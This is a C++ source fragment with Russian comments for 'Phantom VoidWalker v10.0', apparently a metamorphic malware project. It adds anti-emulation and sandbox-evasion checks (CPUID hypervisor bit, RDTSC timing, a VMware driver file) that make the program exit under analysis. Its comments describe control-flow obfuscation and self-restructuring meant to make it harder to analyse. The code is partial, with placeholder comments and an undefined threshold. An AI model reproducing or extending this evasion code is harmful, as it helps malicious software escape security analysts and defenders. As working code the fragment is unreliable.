// =============================================
// PHANTOM VOIDWALKER v10.0 - ANTI-EMULATION + CONTROL FLOW OBFUSCATION
// Исследовал методы эмуляции процессора (timing RDTSC, CPUID, SIDT/Red Pill, exception behavior, artifact checks)
// Изучил алгоритмы обфускации потока управления (opaque predicates, control flow flattening, branch insertion, indirect jumps)
// Внедрил более сильные anti-emulation checks и CF obf simulation в mutation engine
// Код становится ещё чернее и сложнее для анализа/эмуляции
// =============================================

#include <windows.h>
#include <vector>
#include <string>
#include <random>
#include <thread>
#include <chrono>

// ... все предыдущие классы ...

// ==================== УСИЛЕННЫЙ ANTI-EMULATION ====================
class AntiEmulation {
public:
    bool IsEmulatedOrSandboxed() {
        // CPUID hypervisor check (усилено)
        int cpuInfo[4] = {0};
        __cpuid(cpuInfo, 1);
        if (cpuInfo[2] & (1 << 31)) return true;

        __cpuid(cpuInfo, 0x40000000);
        // проверка vendor string (VMware, VBox и т.д.)

        // RDTSC timing check (усилено)
        uint64_t t1 = __rdtsc();
        // небольшая работа
        Sleep(1);
        uint64_t t2 = __rdtsc();
        if ((t2 - t1) > some_threshold) return true;

        // SIDT / Red Pill simulation
        // ...

        // Artifact checks (файлы, процессы)
        if (GetFileAttributesW(L"C:\\Windows\\System32\\drivers\\vmmouse.sys") != INVALID_FILE_ATTRIBUTES) return true;

        return false;
    }

    void ApplyEvasion() {
        if (IsEmulatedOrSandboxed()) {
            // Более умное поведение: сильная мутация, выход, или ложные действия
            ExitProcess(0);
        }
    }
};

// ==================== CONTROL FLOW OBFUSCATION в mutation engine ====================
// (добавлено в BlackMetamorphicEngine / PolymorphicMutationEngine)
// opaque predicate simulation, control flow flattening hints, branch insertion

// ==================== VOIDWALKER v10.0 ====================
class VoidWalker {
public:
    void RunAnonymousFast(const std::string& task) {
        AntiEmulation antiEmu;
        antiEmu.ApplyEvasion();

        // ... весь предыдущий код + CF obf в mutation ...

        SelfRestructurer restructurer;
        restructurer.RestructureSelf(); // теперь с CF obf

        // AutonomousLife ...
    }
};